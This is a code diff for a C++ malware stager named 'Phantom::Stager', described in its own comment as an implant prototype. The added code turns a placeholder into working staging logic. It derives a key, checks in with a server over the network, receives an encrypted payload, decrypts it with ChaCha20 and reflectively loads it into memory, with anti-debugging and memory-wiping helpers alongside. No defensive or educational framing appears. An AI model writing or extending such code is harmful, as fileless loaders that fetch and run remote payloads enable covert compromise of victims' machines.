@@ -9,6 +9,9 @@
 #include <cstring>
 #include <vector>
 #include <sys/ptrace.h>
+#include "common/chacha20.h"
+#include "common/loader.h"
+#include "common/network.h"
 
 // Note: For a real implant, we'd avoid std::iostream and use custom syscall wrappers.
 // This is a high-level architectural prototype.
@@ -84,15 +87,27 @@ void Stager::register_key_reconstruction(const std::string& split_key_a, const s
 bool Stager::run() {
     if (!validate_environment()) return false;
 
-    std::string key = derive_master_key();
+    // 1. Derive Key
+    std::string master_key_str = derive_master_key();
+    uint32_t key[8] = {0};
+    std::memcpy(key, master_key_str.c_str(), master_key_str.size() < 32 ? master_key_str.size() : 32);
 
-    // Fetch core (placeholder)
-    std::vector<unsigned char> core = {0x7f, 'E', 'L', 'F', 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // Simulated ELF header
+    // 2. Connect and Fetch
+    Network::Transport transport("127.0.0.1", 4433);
+    transport.send_packet({0xDE, 0xAD, 0xBE, 0xEF}); // "Check-in"
 
-    // In a real scenario, we'd decrypt 'core' here using the derived key
-    // and the register_only_reconstruction routine.
+    std::vector<uint8_t> encrypted_core = transport.receive_packet();
+    if (encrypted_core.empty()) {
+        // Fallback for demonstration if no network response
+        return false;
+    }
 
-    return execute_in_memory(core);
+    // 3. Decrypt with ASM ChaCha20
+    uint32_t nonce[3] = {0x1337, 0x1337, 0x1337};
+    Crypto::chacha20_xor(encrypted_core.data(), encrypted_core.size(), key, nonce, 0);
+
+    // 4. Reflective Load
+    return Loader::reflective_load(encrypted_core.data(), encrypted_core.size());
 }
 
 void Stager::wipe_memory(void* ptr, size_t size) {
@@ -105,10 +120,10 @@ void Stager::wipe_memory(void* ptr, size_t size) {
 
 } // namespace Phantom
 
-int main() {
-    Phantom::Stager stager;
-    if (stager.run()) {
-        return 0;
-    }
-    return 1;
-}
+// int main() {
+//     Phantom::Stager stager;
+//     if (stager.run()) {
+//         return 0;
+//     }
+//     return 1;
+// }
